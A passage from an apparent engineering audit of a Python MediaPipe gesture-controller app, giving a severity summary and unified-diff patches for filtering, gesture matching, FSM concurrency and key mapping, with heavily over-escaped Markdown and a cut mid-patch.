|**P1 (critical)**|80|`eval()` in SafeExpressionEvaluator, no Accessibility prompt, hot-reload stale refs, no property tests, no SBOM|
|**P2 (major)**|\~50|Dead EventBus queue, ActionMapper dead code, schema gaps, test quality bugs|
|**P3 (minor)**|\~25|Duplicate main.py, dead code branches|
|**P4 (polish)**|\~10|Empty docstrings, README emojis|
\---
## 7\. Concrete Code Patches
The 12 highest-impact patches, ready to apply. All diffs are unified format. Line numbers are approximate; verify against current source before applying.
### Patch 1 — Fix Windows import `NameError` + scope the ctypes monkeypatch
**File:** `gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`
**Severity:** P0-1
**Impact:** App cannot start on Windows.
```diff
--- a/gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py
+++ b/gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py
@@ -1,22 +1,32 @@
 """
 Gesture Controller package.
 """
+from \\\\\\\_\\\\\\\_future\\\\\\\_\\\\\\\_ import annotations
+from typing import Any
 \\\\\\\_\\\\\\\_version\\\\\\\_\\\\\\\_ = "0.1.0"
-# Apply Windows ctypes patch for MediaPipe on Python 3.14+
+# Apply Windows ctypes patch for MediaPipe on Python 3.14+.
+# Gate behind env var so tests and non-MediaPipe consumers can opt out.
 import os
 if os.name == "nt":
     import ctypes
-    \\\\\\\_orig\\\\\\\_cdll\\\\\\\_init = ctypes.CDLL.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_
-    def \\\\\\\_patched\\\\\\\_cdll\\\\\\\_init(self, name: str | None, \\\\\\\*args: Any, \\\\\\\*\\\\\\\*kwargs: Any) -> None:
-        \\\\\\\_orig\\\\\\\_cdll\\\\\\\_init(self, name, \\\\\\\*args, \\\\\\\*\\\\\\\*kwargs)
-        if name and "libmediapipe" in name:
-            if not hasattr(self, "free"):
-                try:
-                    self.free = ctypes.CDLL("msvcrt").free
-                except Exception:
-                    pass
-    # Avoid type annotation issues by bypassing strict checks for monkeypatching
-    from typing import Any
-    ctypes.CDLL.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_ = \\\\\\\_patched\\\\\\\_cdll\\\\\\\_init  # type: ignore
+    if os.environ.get("MAESTRO\\\\\\\_PATCH\\\\\\\_CDLL", "1") == "1":
+        \\\\\\\_orig\\\\\\\_cdll\\\\\\\_init = ctypes.CDLL.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_
+        \\\\\\\_msvcrt = ctypes.CDLL("msvcrt")
+        \\\\\\\_msvcrt\\\\\\\_free = \\\\\\\_msvcrt.free
+
+        def \\\\\\\_patched\\\\\\\_cdll\\\\\\\_init(self: Any, name: str | None, \\\\\\\*args: Any, \\\\\\\*\\\\\\\*kwargs: Any) -> None:
+            \\\\\\\_orig\\\\\\\_cdll\\\\\\\_init(self, name, \\\\\\\*args, \\\\\\\*\\\\\\\*kwargs)
+            if name and "libmediapipe" in name and not hasattr(self, "free"):
+                self.free = \\\\\\\_msvcrt\\\\\\\_free  # Reuse a single msvcrt handle
+
+        ctypes.CDLL.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_ = \\\\\\\_patched\\\\\\\_cdll\\\\\\\_init  # type: ignore\\\\\\\[method-assign]
```
**Rationale:** `from \\\\\\\_\\\\\\\_future\\\\\\\_\\\\\\\_ import annotations` (PEP 563) makes annotations lazy, so `Any` need not be in scope at `def` time. The shared `\\\\\\\_msvcrt\\\\\\\_free` eliminates the per-`CDLL` leak. The env-var gate allows opt-out.
### Patch 2 — Switch MediaPipe to VIDEO mode
**File:** `gesture\\\\\\\_controller/vision/landmark\\\\\\\_extractor.py` + `gesture\\\\\\\_controller/core/engine.py`
**Severity:** P0-2, P0-5 (partial)
**Impact:** 3–5× faster inference, enables hand-ID tracking via `tracking\\\\\\\_id`.
```diff
--- a/gesture\\\\\\\_controller/vision/landmark\\\\\\\_extractor.py
+++ b/gesture\\\\\\\_controller/vision/landmark\\\\\\\_extractor.py
@@ -30,9 +30,9 @@ class LandmarkExtractor:
         base\\\\\\\_options = python.BaseOptions(model\\\\\\\_asset\\\\\\\_path=model\\\\\\\_path\\\\\\\_str)
         self.\\\\\\\_options = vision.HandLandmarkerOptions(
             base\\\\\\\_options=base\\\\\\\_options,
-            running\\\\\\\_mode=vision.RunningMode.IMAGE,
+            running\\\\\\\_mode=vision.RunningMode.VIDEO,
             num\\\\\\\_hands=config.get("engine", {}).get("max\\\\\\\_hands", 2),
             min\\\\\\\_hand\\\\\\\_detection\\\\\\\_confidence=config.get("engine", {}).get("min\\\\\\\_detection\\\\\\\_confidence", 0.7),
-            min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence=config.get("engine", {}).get("min\\\\\\\_tracking\\\\\\\_confidence", 0.5),
+            min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence=config.get("engine", {}).get("min\\\\\\\_presence\\\\\\\_confidence", 0.5),
         )
         self.\\\\\\\_landmarker = vision.HandLandmarker.create\\\\\\\_from\\\\\\\_options(self.\\\\\\\_options)
+        self.\\\\\\\_last\\\\\\\_timestamp\\\\\\\_ms = -1
         logger.info("MediaPipe HandLandmarker Tasks API initialized")
-    def extract(self, shm\\\\\\\_name: str) -> list\\\\\\\[Hand] | None:
+    def extract(self, shm\\\\\\\_name: str, timestamp\\\\\\\_s: float) -> list\\\\\\\[Hand] | None:
+        # MediaPipe VIDEO mode requires strictly monotonically increasing
+        # integer millisecond timestamps; guard against NTP slew / resume.
+        ts\\\\\\\_ms = int(timestamp\\\\\\\_s \\\\\\\* 1000)
+        if ts\\\\\\\_ms <= self.\\\\\\\_last\\\\\\\_timestamp\\\\\\\_ms:
+            ts\\\\\\\_ms = self.\\\\\\\_last\\\\\\\_timestamp\\\\\\\_ms + 1
+        self.\\\\\\\_last\\\\\\\_timestamp\\\\\\\_ms = ts\\\\\\\_ms
+
         try:
             shm = shared\\\\\\\_memory.SharedMemory(name=shm\\\\\\\_name)
             frame = np.ndarray((480, 640, 3), dtype=np.uint8, buffer=shm.buf)
@@ -62,7 +74,7 @@ class LandmarkExtractor:
         mp\\\\\\\_image = mp.Image(image\\\\\\\_format=mp.ImageFormat.SRGB, data=rgb\\\\\\\_frame)
         try:
-            results = self.\\\\\\\_landmarker.detect(mp\\\\\\\_image)
+            results = self.\\\\\\\_landmarker.detect\\\\\\\_for\\\\\\\_video(mp\\\\\\\_image, ts\\\\\\\_ms)
         except Exception as e:
             logger.error("MediaPipe HandLandmarker inference failed", error=str(e))
             return None
```
**Companion change in `core/engine.py`:**
```diff
@@ -199,7 +199,7 @@ class GestureEngine:
                 timestamp = now
-                hands = self.\\\\\\\_extractor.extract(self.\\\\\\\_shm\\\\\\\_name)
+                hands = self.\\\\\\\_extractor.extract(self.\\\\\\\_shm\\\\\\\_name, timestamp)
```
### Patch 3 — Fix One-Euro filter params + NaN handling
**File:** `gesture\\\\\\\_controller/vision/one\\\\\\\_euro\\\\\\\_filter.py`
**Severity:** P0-3, P1-16
**Impact:** Filtered landmarks track real motion; NaN doesn't poison filter state.
```diff
--- a/gesture\\\\\\\_controller/vision/one\\\\\\\_euro\\\\\\\_filter.py
+++ b/gesture\\\\\\\_controller/vision/one\\\\\\\_euro\\\\\\\_filter.py
@@ -1,5 +1,6 @@
 import numpy as np
 from typing import Any
+import structlog
+logger = structlog.get\\\\\\\_logger(\\\\\\\_\\\\\\\_name\\\\\\\_\\\\\\\_)
 class OneEuroFilter:
     def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config: dict\\\\\\\[str, Any]) -> None:
         oe\\\\\\\_config = config.get("filtering", {}).get("one\\\\\\\_euro", {})
-        self.\\\\\\\_min\\\\\\\_cutoff = oe\\\\\\\_config.get("min\\\\\\\_cutoff", 0.004)
-        self.\\\\\\\_beta = oe\\\\\\\_config.get("beta", 0.04)
+        # Defaults follow Casiez et al. CHI 2012 and the MediaPipe sample
+        # for 30 FPS hand-landmark smoothing. DO NOT set min\\\\\\\_cutoff below \\\\\\\~0.5
+        # or the filter time-constant exceeds 300 ms and gestures feel laggy.
+        self.\\\\\\\_min\\\\\\\_cutoff = oe\\\\\\\_config.get("min\\\\\\\_cutoff", 1.0)
+        self.\\\\\\\_beta = oe\\\\\\\_config.get("beta", 0.007)
         self.\\\\\\\_derivate\\\\\\\_cutoff = oe\\\\\\\_config.get("derivate\\\\\\\_cutoff", 1.0)
@@ -31,6 +33,16 @@ class OneEuroFilter:
         Returns:
             (filtered\\\\\\\_landmarks, velocity, acceleration) each (21, 3)
         """
+        # Spec §7.2: NaN/Inf in input -> reset filter state, skip frame.
+        # Returning zeros lets the engine detect the skip via np.isfinite().
+        if not np.all(np.isfinite(landmarks)):
+            logger.warning("NaN/Inf in landmark input; resetting filter and skipping frame")
+            self.reset()
+            zeros = np.zeros\\\\\\\_like(landmarks)
+            return zeros, zeros, zeros
+
         # Dynamic parameter adaptation
         min\\\\\\\_cutoff = self.\\\\\\\_min\\\\\\\_cutoff
         beta = self.\\\\\\\_beta
```
**Companion test** (so CI catches regressions):
```diff
--- a/gesture\\\\\\\_controller/tests/unit/test\\\\\\\_one\\\\\\\_euro\\\\\\\_filter.py
+++ b/gesture\\\\\\\_controller/tests/unit/test\\\\\\\_one\\\\\\\_euro\\\\\\\_filter.py
@@ -92,3 +92,30 @@ def test\\\\\\\_nan\\\\\\\_input\\\\\\\_recovery(filter\\\\\\\_config: dict) -> None:
     try:
         f.filter(nan\\\\\\\_pose, timestamp=0.033)
     except Exception:
         pytest.fail("Filter crashed on NaN input")
+
+
+def test\\\\\\\_step\\\\\\\_input\\\\\\\_settles\\\\\\\_within\\\\\\\_300ms(filter\\\\\\\_config: dict) -> None:
+    """A step input must reach 90% of target within 300 ms at 30 FPS.
+    Catches the min\\\\\\\_cutoff=0.004 regression where tau \\\\\\\~= 40 s."""
+    f = OneEuroFilter(filter\\\\\\\_config)
+    start = np.zeros((21, 3))
+    target = np.ones((21, 3)) \\\\\\\* 0.5
+    f.filter(start, timestamp=0.0)
+    for i in range(1, 12):  # 11 frames @ 33ms = 363 ms
+        filtered, \\\\\\\_, \\\\\\\_ = f.filter(target, timestamp=float(i) \\\\\\\* 0.033)
+    assert np.mean(np.abs(filtered - target)) < 0.1
+
+
+def test\\\\\\\_nan\\\\\\\_input\\\\\\\_resets\\\\\\\_state\\\\\\\_and\\\\\\\_recovers(filter\\\\\\\_config: dict) -> None:
+    """NaN must reset the filter so the next clean frame starts fresh."""
+    f = OneEuroFilter(filter\\\\\\\_config)
+    clean = np.random.rand(21, 3)
+    f.filter(clean, timestamp=0.0)
+    nan\\\\\\\_pose = clean.copy(); nan\\\\\\\_pose\\\\\\\[0, 0] = np.nan
+    out, \\\\\\\_, \\\\\\\_ = f.filter(nan\\\\\\\_pose, timestamp=0.033)
+    assert np.all(np.isfinite(out))
+    out2, \\\\\\\_, \\\\\\\_ = f.filter(clean, timestamp=0.066)
+    assert np.all(np.isfinite(out2))
+    np.testing.assert\\\\\\\_allclose(out2, clean, atol=1e-6)
```
### Patch 4 — DTW cooldown + precomputed templates
**File:** `gesture\\\\\\\_controller/models/dtw\\\\\\\_matcher.py` + `gesture\\\\\\\_controller/core/engine.py`
**Severity:** P0-4
**Impact:** Single gesture triggers OS action once, not 60+ times.
```diff
--- a/gesture\\\\\\\_controller/models/dtw\\\\\\\_matcher.py
+++ b/gesture\\\\\\\_controller/models/dtw\\\\\\\_matcher.py
@@ -163,12 +163,18 @@ class CustomGestureMatcher:
     def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config: dict | None = None) -> None:
         self.\\\\\\\_templates: dict\\\\\\\[str, dict] = {}
         self.\\\\\\\_buffer: np.ndarray = np.zeros((60, 63), dtype=np.float64)
         self.\\\\\\\_buffer\\\\\\\_idx: int = 0
         self.\\\\\\\_buffer\\\\\\\_full: bool = False
         self.\\\\\\\_frame\\\\\\\_count: int = 0
+        self.\\\\\\\_last\\\\\\\_match\\\\\\\_monotonic: float = 0.0
+        self.\\\\\\\_last\\\\\\\_matched\\\\\\\_name: str | None = None
+        cfg = config or {}
+        self.\\\\\\\_cooldown\\\\\\\_s: float = cfg.get("dtw", {}).get("cooldown\\\\\\\_ms", 1000.0) / 1000.0
+        self.\\\\\\\_refractory\\\\\\\_s: float = cfg.get("dtw", {}).get("refractory\\\\\\\_ms", 2000.0) / 1000.0
+        self.\\\\\\\_precomputed\\\\\\\_templates: np.ndarray | None = None
+        self.\\\\\\\_precomputed\\\\\\\_thresholds: np.ndarray | None = None
+        self.\\\\\\\_precomputed\\\\\\\_names: list\\\\\\\[str] | None = None
         self.load\\\\\\\_templates(self.\\\\\\\_template\\\\\\\_dir)
         self.\\\\\\\_warmup()
@@ -216,6 +222,10 @@ class CustomGestureMatcher:
     def reset(self) -> None:
         self.\\\\\\\_buffer.fill(0.0)
         self.\\\\\\\_buffer\\\\\\\_idx = 0
         self.\\\\\\\_buffer\\\\\\\_full = False
         self.\\\\\\\_frame\\\\\\\_count = 0
+        self.\\\\\\\_last\\\\\\\_match\\\\\\\_monotonic = 0.0
+        self.\\\\\\\_last\\\\\\\_matched\\\\\\\_name = None
-    def match(self) -> GestureEvent | None:
+    def match(self, timestamp\\\\\\\_s: float) -> GestureEvent | None:
+        """Returns GestureEvent if a template matches AND per-gesture cooldown
+        has elapsed. A matched gesture enters a refractory period during which
+        the SAME gesture cannot re-trigger, followed by a global cooldown
+        during which NO custom gesture can trigger."""
         if not self.\\\\\\\_buffer\\\\\\\_full or not self.\\\\\\\_templates:
             return None
+        # Global cooldown
+        if self.\\\\\\\_last\\\\\\\_matched\\\\\\\_name is not None and \\\\\\\\
+           (timestamp\\\\\\\_s - self.\\\\\\\_last\\\\\\\_match\\\\\\\_monotonic) < self.\\\\\\\_cooldown\\\\\\\_s:
+            return None
+
+        # Lazily (re)build the stacked template array
+        if self.\\\\\\\_precomputed\\\\\\\_names is None or \\\\\\\\
+           self.\\\\\\\_precomputed\\\\\\\_names != list(self.\\\\\\\_templates.keys()):
+            self.\\\\\\\_rebuild\\\\\\\_precomputed()
+        if self.\\\\\\\_precomputed\\\\\\\_templates is None or self.\\\\\\\_precomputed\\\\\\\_templates.shape\\\\\\\[0] == 0:
+            return None
         if self.\\\\\\\_buffer\\\\\\\_idx == 0:
             query = self.\\\\\\\_buffer
         else:
             query = np.roll(self.\\\\\\\_buffer, -self.\\\\\\\_buffer\\\\\\\_idx, axis=0)
-        template\\\\\\\_names = list(self.\\\\\\\_templates.keys())
-        template\\\\\\\_arrays = np.array(\\\\\\\[self.\\\\\\\_templates\\\\\\\[n]\\\\\\\["template"] for n in template\\\\\\\_names], dtype=np.float64)
-        threshold\\\\\\\_array = np.array(\\\\\\\[self.\\\\\\\_templates\\\\\\\[n]\\\\\\\["threshold"] for n in template\\\\\\\_names], dtype=np.float64)
-
-        best\\\\\\\_idx, best\\\\\\\_dist = dtw\\\\\\\_distance\\\\\\\_batch(query, template\\\\\\\_arrays, threshold\\\\\\\_array)
+        best\\\\\\\_idx, best\\\\\\\_dist = dtw\\\\\\\_distance\\\\\\\_batch(
+            query, self.\\\\\\\_precomputed\\\\\\\_templates, self.\\\\\\\_precomputed\\\\\\\_thresholds,
+        )
         if best\\\\\\\_idx >= 0:
-            name = template\\\\\\\_names\\\\\\\[best\\\\\\\_idx]
+            name = self.\\\\\\\_precomputed\\\\\\\_names\\\\\\\[best\\\\\\\_idx]
+            # Per-gesture refractory
+            if name == self.\\\\\\\_last\\\\\\\_matched\\\\\\\_name and \\\\\\\\
+               (timestamp\\\\\\\_s - self.\\\\\\\_last\\\\\\\_match\\\\\\\_monotonic) < self.\\\\\\\_refractory\\\\\\\_s:
+                return None
+            self.\\\\\\\_last\\\\\\\_match\\\\\\\_monotonic = timestamp\\\\\\\_s
+            self.\\\\\\\_last\\\\\\\_matched\\\\\\\_name = name
             confidence = float(np.clip(1.0 - best\\\\\\\_dist, 0.0, 1.0))
             return GestureEvent(
                 gesture\\\\\\\_name=name,
                 gesture\\\\\\\_type="custom",
                 action=self.\\\\\\\_templates\\\\\\\[name]\\\\\\\["action"],
                 confidence=confidence,
-                hand="Right",
-                timestamp=time.time(),
+                hand="Right",  # TODO: plumb real handedness
+                timestamp=timestamp\\\\\\\_s,
                 gesture\\\\\\\_source="dtw",
             )
         return None
+
+    def \\\\\\\_rebuild\\\\\\\_precomputed(self) -> None:
+        names = list(self.\\\\\\\_templates.keys())
+        if not names:
+            self.\\\\\\\_precomputed\\\\\\\_templates = np.zeros((0, 60, 63), dtype=np.float64)
+            self.\\\\\\\_precomputed\\\\\\\_thresholds = np.zeros((0,), dtype=np.float64)
+            self.\\\\\\\_precomputed\\\\\\\_names = \\\\\\\[]
+            return
+        self.\\\\\\\_precomputed\\\\\\\_templates = np.stack(
+            \\\\\\\[self.\\\\\\\_templates\\\\\\\[n]\\\\\\\["template"] for n in names], axis=0,
+        ).astype(np.float64, copy=False)
+        self.\\\\\\\_precomputed\\\\\\\_thresholds = np.array(
+            \\\\\\\[self.\\\\\\\_templates\\\\\\\[n]\\\\\\\["threshold"] for n in names], dtype=np.float64,
+        )
+        self.\\\\\\\_precomputed\\\\\\\_names = names
```
**Companion change in `core/engine.py`:**
```diff
@@ -248,7 +248,7 @@ class GestureEngine:
                         event = self.\\\\\\\_fsm\\\\\\\_manager.evaluate(features)
                         if not event:
-                            event = self.\\\\\\\_custom\\\\\\\_matcher.match()
+                            event = self.\\\\\\\_custom\\\\\\\_matcher.match(timestamp)
```
### Patch 5 — Per-hand OneEuroFilter
**File:** `gesture\\\\\\\_controller/core/engine.py`
**Severity:** P0-6
**Impact:** Two-hand gestures get independent smoothing state.
```diff
--- a/gesture\\\\\\\_controller/core/engine.py
+++ b/gesture\\\\\\\_controller/core/engine.py
@@ -33,6 +33,7 @@ class GestureEngine:
         self.\\\\\\\_frame\\\\\\\_count = 0
         self.\\\\\\\_current\\\\\\\_hands: list\\\\\\\[Hand] = \\\\\\\[]
         self.\\\\\\\_fps = 0.0
+        self.\\\\\\\_filters: dict\\\\\\\[str, OneEuroFilter] = {}
         self.\\\\\\\_last\\\\\\\_fps\\\\\\\_time = time.monotonic()
@@ -79,9 +80,6 @@ class GestureEngine:
         # 3. Initialize Landmark Extractor (Process B)
         self.\\\\\\\_extractor = LandmarkExtractor(self.\\\\\\\_config.\\\\\\\_config)
-        # 4. Initialize One-Euro Filter
-        self.\\\\\\\_filter = OneEuroFilter(merged\\\\\\\_config)
-
         # 5. Initialize Gesture FSM Manager
         self.\\\\\\\_fsm\\\\\\\_manager = GestureFSMManager(merged\\\\\\\_config, self.\\\\\\\_event\\\\\\\_bus)
@@ -207,8 +205,11 @@ class GestureEngine:
                     smoothed\\\\\\\_hands = \\\\\\\[]
                     for hand in hands:
-                        lm\\\\\\\_array = np.array(\\\\\\\[\\\\\\\[l.x, l.y, l.z] for l in hand.landmarks], dtype=np.float64)
+                        lm\\\\\\\_array = np.array(\\\\\\\[\\\\\\\[l.x, l.y, l.z] for l in hand.landmarks], dtype=np.float32)
+
+                        filt = self.\\\\\\\_filters.get(hand.handedness)
+                        if filt is None:
+                            filt = OneEuroFilter(self.\\\\\\\_config.\\\\\\\_config)
+                            self.\\\\\\\_filters\\\\\\\[hand.handedness] = filt
                         mcp5 = lm\\\\\\\_array\\\\\\\[5]
                         wrist = lm\\\\\\\_array\\\\\\\[0]
                         depth\\\\\\\_metric = float(np.linalg.norm(mcp5 - wrist))
-                        filtered, velocity, acceleration = self.\\\\\\\_filter.filter(
+                        filtered, velocity, acceleration = filt.filter(
                             lm\\\\\\\_array,
                             timestamp,
                             lighting\\\\\\\_metric=None,
@@ -258,9 +259,8 @@ class GestureEngine:
                     self.\\\\\\\_current\\\\\\\_hands = smoothed\\\\\\\_hands
                 else:
                     self.\\\\\\\_current\\\\\\\_hands = \\\\\\\[]
-                    self.\\\\\\\_filter.reset()
-                    self.\\\\\\\_fsm\\\\\\\_manager.reset\\\\\\\_all()
-                    self.\\\\\\\_custom\\\\\\\_matcher.reset()
+                    for f in self.\\\\\\\_filters.values():
+                        f.reset()
+                    self.\\\\\\\_fsm\\\\\\\_manager.reset\\\\\\\_all()
+                    self.\\\\\\\_custom\\\\\\\_matcher.reset()
```
### Patch 6 — Stop mutating shared FeatureVector across FSMs
**File:** `gesture\\\\\\\_controller/core/state\\\\\\\_machine.py`
**Severity:** P0-7
**Impact:** Delta fields are correct for every FSM, not just the first.
```diff
--- a/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
+++ b/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
@@ -1,4 +1,5 @@
 import ast
+import copy
 import operator
 import time
 import structlog
@@ -194,11 +195,17 @@ class GestureFSM:
         # Populate delta values dynamically based on state entry features
         if self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry is not None:
-            features.index\\\\\\\_tip\\\\\\\_delta\\\\\\\_y = features.index\\\\\\\_tip\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.index\\\\\\\_tip\\\\\\\[1]
-            features.palm\\\\\\\_center\\\\\\\_delta\\\\\\\_x = features.palm\\\\\\\_center\\\\\\\[0] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[0]
-            features.palm\\\\\\\_center\\\\\\\_delta\\\\\\\_y = features.palm\\\\\\\_center\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[1]
-            features.palm\\\\\\\_delta\\\\\\\_y = features.palm\\\\\\\_center\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[1]
+            # Shallow-copy so per-FSM delta fields don't corrupt the shared
+            # instance seen by sibling FSMs. numpy arrays are shared by
+            # reference (read-only here), which is fine.
+            fv = copy.copy(features)
+            fv.index\\\\\\\_tip\\\\\\\_delta\\\\\\\_y = features.index\\\\\\\_tip\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.index\\\\\\\_tip\\\\\\\[1]
+            fv.palm\\\\\\\_center\\\\\\\_delta\\\\\\\_x = features.palm\\\\\\\_center\\\\\\\[0] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[0]
+            fv.palm\\\\\\\_center\\\\\\\_delta\\\\\\\_y = features.palm\\\\\\\_center\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[1]
+            fv.palm\\\\\\\_delta\\\\\\\_y = features.palm\\\\\\\_center\\\\\\\[1] - self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry.palm\\\\\\\_center\\\\\\\[1]
+        else:
+            fv = features
         # 4. Evaluate transitions
         for transition in state.transitions:
             try:
-                condition\\\\\\\_met = transition.condition\\\\\\\_fn(features)
+                condition\\\\\\\_met = transition.condition\\\\\\\_fn(fv)
             except Exception as e:
                 logger.error("Error evaluating condition", fsm=self.name, error=str(e), condition=transition.condition)
                 condition\\\\\\\_met = False
```
### Patch 7 — Lock FSM list against concurrent hot-reload
**File:** `gesture\\\\\\\_controller/core/state\\\\\\\_machine.py`
**Severity:** P0-8
**Impact:** Reload mid-iteration no longer tears the FSM list.
```diff
--- a/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
+++ b/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
@@ -1,6 +1,7 @@
 import ast
 import copy
 import operator
+import threading
 import time
 import structlog
@@ -285,11 +286,13 @@ class GestureFSMManager:
     def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config: dict\\\\\\\[str, Any], event\\\\\\\_bus: EventBus) -> None:
         self.\\\\\\\_fsms: list\\\\\\\[GestureFSM] = \\\\\\\[]
         self.\\\\\\\_event\\\\\\\_bus = event\\\\\\\_bus
         self.\\\\\\\_global\\\\\\\_cooldown\\\\\\\_until = 0.0
+        self.\\\\\\\_lock = threading.RLock()
         engine\\\\\\\_cfg = config.get("engine", {})
         self.\\\\\\\_global\\\\\\\_cooldown\\\\\\\_ms = float(engine\\\\\\\_cfg.get("global\\\\\\\_cooldown\\\\\\\_ms", 200.0))
         self.\\\\\\\_thresholds = config.get("config", {}).get("default\\\\\\\_thresholds", {})
         self.\\\\\\\_load\\\\\\\_gestures(config)
     def reload\\\\\\\_gestures(self, config: dict\\\\\\\[str, Any]) -> None:
-        self.\\\\\\\_fsms = \\\\\\\[]
-        self.\\\\\\\_load\\\\\\\_gestures(config)
-        logger.info("GestureFSMManager reloaded gestures", count=len(self.\\\\\\\_fsms))
+        # Build the new list off-lock, then swap atomically.
+        prev\\\\\\\_fsms = self.\\\\\\\_fsms
+        self.\\\\\\\_fsms = \\\\\\\[]
+        try:
+            self.\\\\\\\_load\\\\\\\_gestures(config)
+        except Exception:
+            self.\\\\\\\_fsms = prev\\\\\\\_fsms  # roll back on failure
+            logger.exception("Gesture reload failed; keeping previous FSM set")
+            return
+        logger.info("GestureFSMManager reloaded gestures", count=len(self.\\\\\\\_fsms))
@@ -357,7 +370,9 @@ class GestureFSMManager:
     def evaluate(self, features: FeatureVector) -> GestureEvent | None:
         candidates = \\\\\\\[]
-        for fsm in self.\\\\\\\_fsms:
+        # Snapshot the list under the lock so a concurrent reload cannot
+        # mutate it mid-iteration.
+        with self.\\\\\\\_lock:
+            fsms\\\\\\\_snapshot = list(self.\\\\\\\_fsms)
+        for fsm in fsms\\\\\\\_snapshot:
             in\\\\\\\_global\\\\\\\_cooldown = features.timestamp < self.\\\\\\\_global\\\\\\\_cooldown\\\\\\\_until
             if in\\\\\\\_global\\\\\\\_cooldown and not (fsm.gesture\\\\\\\_type == "continuous" and fsm.current\\\\\\\_state == "ScrollingActive"):
                 continue
```
### Patch 8 — Fix chained-comparison semantics
**File:** `gesture\\\\\\\_controller/core/state\\\\\\\_machine.py`
**Severity:** P0-9
**Impact:** `a < b < c` evaluates as `a < b and b < c`, not `(a < b) < c`.
```diff
--- a/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
+++ b/gesture\\\\\\\_controller/core/state\\\\\\\_machine.py
@@ -38,17 +38,28 @@ def compile\\\\\\\_condition(expr\\\\\\\_str: str, thresholds: dict\\\\\\\[str, float]) -> Callable\\\\\\\[\\\\\\\[
         elif isinstance(node, ast.Constant):
             return node.value
         elif isinstance(node, ast.Compare):
-            left = \\\\\\\_eval\\\\\\\_node(node.left)
-            for op, comparator in zip(node.ops, node.comparators):
-                right = \\\\\\\_eval\\\\\\\_node(comparator)
-                op\\\\\\\_fn = ALLOWED\\\\\\\_OPS.get(type(op))
-                if op\\\\\\\_fn is None:
-                    raise ValueError(f"Disallowed operator: {type(op).\\\\\\\_\\\\\\\_name\\\\\\\_\\\\\\\_}")
-                left = ("\\\\\\\_cmp", op\\\\\\\_fn, left, right)
-            return left
+            # Python's `a < b < c` means `a < b and b < c`, NOT `(a < b) < c`.
+            operands = \\\\\\\[node.left, \\\\\\\*node.comparators]
+            pair\\\\\\\_results = \\\\\\\[]
+            for op, left\\\\\\\_node, right\\\\\\\_node in zip(node.ops, operands\\\\\\\[:-1], operands\\\\\\\[1:]):
+                op\\\\\\\_fn = ALLOWED\\\\\\\_OPS.get(type(op))
+                if op\\\\\\\_fn is None:
+                    raise ValueError(f"Disallowed operator: {type(op).\\\\\\\_\\\\\\\_name\\\\\\\_\\\\\\\_}")
+                pair\\\\\\\_results.append(("\\\\\\\_cmp", op\\\\\\\_fn, \\\\\\\_eval\\\\\\\_node(left\\\\\\\_node), \\\\\\\_eval\\\\\\\_node(right\\\\\\\_node)))
+            if len(pair\\\\\\\_results) == 1:
+                return pair\\\\\\\_results\\\\\\\[0]
+            return ("\\\\\\\_bool", ALLOWED\\\\\\\_OPS\\\\\\\[ast.And], pair\\\\\\\_results)
         elif isinstance(node, ast.BoolOp):
             values = \\\\\\\[\\\\\\\_eval\\\\\\\_node(v) for v in node.values]
             op\\\\\\\_fn = ALLOWED\\\\\\\_OPS.get(type(node.op))
             if op\\\\\\\_fn is None:
                 raise ValueError(f"Disallowed boolean op: {type(node.op).\\\\\\\_\\\\\\\_name\\\\\\\_\\\\\\\_}")
             return ("\\\\\\\_bool", op\\\\\\\_fn, values)
```
### Patch 9 — Cross-platform key-name normalization
**File:** `gesture\\\\\\\_controller/os\\\\\\\_integration/action\\\\\\\_dispatcher.py` + all three controllers
**Severity:** P0-11, P0-12
**Impact:** `KeyPress:ArrowLeft` works on all platforms; macOS `cmd+m` sends `cmd+m` not `cmd+a`.
```diff
--- a/gesture\\\\\\\_controller/os\\\\\\\_integration/action\\\\\\\_dispatcher.py
+++ b/gesture\\\\\\\_controller/os\\\\\\\_integration/action\\\\\\\_dispatcher.py
@@ -100,8 +100,24 @@ class ActionDispatcher:
+KEY\\\\\\\_ALIASES = {
+    "arrowleft": "left", "arrowright": "right",
+    "arrowup": "up", "arrowdown": "down",
+    "win": "super", "windows": "super", "meta": "super",
+    "enter": "return", "esc": "escape",
+    "pageup": "page\\\\\\\_up", "pagedown": "page\\\\\\\_down",
+    "pgup": "page\\\\\\\_up", "pgdn": "page\\\\\\\_down",
+}
+
+def \\\\\\\_normalize\\\\\\\_key(self, key: str) -> str:
+    k = key.strip().lower()
+    return KEY\\\\\\\_ALIASES.get(k, k)
+
 def \\\\\\\_execute\\\\\\\_keypress(self, keys\\\\\\\_str: str) -> None:
-    keys = keys\\\\\\\_str.split("+")
